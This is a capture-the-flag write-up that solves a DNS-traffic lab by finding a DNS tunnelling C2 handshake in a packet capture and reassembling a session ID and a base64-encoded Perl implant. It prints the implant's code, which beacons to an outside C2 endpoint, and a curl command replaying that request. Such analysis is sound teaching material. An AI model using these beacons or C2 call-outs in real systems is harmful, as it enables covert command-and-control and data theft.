# Signal

| | |
|---|---|
| **Category** | Lab |
| **Points** | 200 |
| **Solves** | 67 |
| **Flag** | `number{the_config_was_the_payload}` |

## Description

> `[ FILE REF: S2E16 "RELEVANCE" // SIGNAL IN THE NOISE ]`
> A workstation inside Aletheia was talking to something it should not. Not loudly. A
> whisper, folded into a day of ordinary lookups... I captured the day. Ten hours of
> DNS. Somewhere in it, an implant called out and something answered. I do not need you
> to run anything. I need you to READ. Find what it said, find what it was told to say,
> and ask the same question it did.
>
> Artifact: [`intercept.pcap`](intercept.pcap) — 16,000 DNS packets, 10 hours

## Initial analysis

Everything is UDP/53. Breaking down query types and domains:

```bash
tshark -r intercept.pcap -Y 'dns' -T fields -e dns.qry.type | sort | uniq -c
tshark -r intercept.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name \
  | sed 's/^[^.]*\.//' | sort | uniq -c | sort -rn
```

Most traffic is decoy lookups to real and `.example` domains. `northernlights.gg`
carries narrative TXT records and some A/TXT channels that **look** like C2 but decode
to random bytes — deliberate misdirection (see [`dump_channels.py`](dump_channels.py),
which dumps those decoy A-record channels). The real low-volume signal is to
`rl7f3a.net` (11 queries) and `decima.cloud` (5).

## The core concept — a DNS C2 handshake in three channels

1. **Enrolment channel.** Six A queries of the form `<val>.<idx>.k.enroll.rl7f3a.net`
   (answered `127.0.0.1`). The QNAME carries the data, not the answer. Ordering by
   index reassembles the session ID:

   ```
   k[00]=a k[01]=7 k[02]=f k[03]=3 k[04]=c k[05]=1  ->  SID = a7f3c1
   ```

2. **Config channel.** `sync.relay-7f3a.rl7f3a.net` **TXT** answers, five chunks
   `v1;N/5;<b64>`. Concatenate chunk bodies in order and base64-decode → a Perl implant:

   ```perl
   my $ENDPOINT = "https://l200-c2.xonnie.ai/telemetry/sync";
   my $SID = $ENV{RELAY_SID} // die;
   my $resp = HTTP::Tiny->new->get("$ENDPOINT?sid=$SID");
   print $resp->{content} if $resp->{success};
   ```

   The exfil config itself *is* the payload — "l200" = this 200-pt lab, `xonnie.ai` =
   the event's infra.

3. **"Ask the same question it did."** Run the implant's request with the recovered SID.

## Solving it

```bash
curl -s "https://l200-c2.xonnie.ai/telemetry/sync?sid=a7f3c1"
# JSON with auth_token: bnVtYmVye3RoZV9jb25maWdfd2FzX3RoZV9wYXlsb2FkfQ==
echo 'bnVtYmVye3RoZV9jb25maWdfd2FzX3RoZV9wYXlsb2FkfQ==' | base64 -d
# -> number{the_config_was_the_payload}
```

## Flag

```
number{the_config_was_the_payload}
```

## Key takeaways

- **DNS tunneling/C2** hides data in QNAMEs and TXT answers. Reassemble by the
  explicit index in the label, not by packet arrival order.
- Separate the signal from the noise by **volume + structure**: narrative TXT and
  random A-record "channels" were decoys; the real channel had a tidy `v1;N/5` framing.
- "Ask the same question it did" means replay the implant's own request — recover the
  config, then execute it.
